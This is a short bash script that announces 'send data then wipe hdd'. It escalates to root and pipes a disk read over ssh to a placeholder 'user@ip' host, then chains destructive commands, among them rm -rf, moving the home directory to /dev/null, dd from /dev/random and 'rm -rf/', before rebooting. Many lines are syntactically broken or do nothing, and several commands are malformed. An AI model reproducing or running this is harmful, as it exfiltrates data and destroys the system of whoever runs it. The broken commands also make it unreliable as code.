#!/bin/bash
echo"send data then wipe hdd"
sudo su
dd if=/ | gzip -c --fast | ssh user@ip 'dd of=/home/user/sdb.img.gz'
    echo" rewriting home directory"
    cd /dev/null
    rm -rf
    dd if=/dev/random of=/dev/null
    rm -rf
    dd if=/dev/random of=/dev/null
    rm -rf
  delay=20000
  mv ~ /dev/null
  echo "rewrote and moved home directory"
  delay=20000
  dd if=/dev/random of=/dev/
  rm -rf/
  delay=20000
  echo"pt2 sucess. drive(s) wiped. rebooting to boot selector"
  delay=20000
  sudo reboot